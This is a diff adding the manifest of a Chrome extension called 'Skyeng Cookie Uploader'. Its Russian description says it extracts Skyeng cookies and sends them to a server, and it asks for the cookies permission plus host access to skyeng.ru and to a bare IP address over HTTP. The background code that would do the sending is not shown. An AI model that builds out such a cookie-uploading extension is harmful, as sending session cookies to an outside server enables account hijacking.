@@ -1,0 +1,23 @@
+// manifest.json
+{
+  "manifest_version": 3,
+  "name": "Skyeng Cookie Uploader",
+  "version": "1.0",
+  "description": "Извлекает cookies Skyeng и отправляет их на сервер",
+  "permissions": [
+    "cookies",
+    "alarms"
+  ],
+  "host_permissions": [
+    "https://*.skyeng.ru/*",
+    "http://2.59.183.62/*"
+  ],
+  "background": {
+    "service_worker": "background.js",
+    "type": "module"
+  },
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Обновить cookies"
+  }
+}
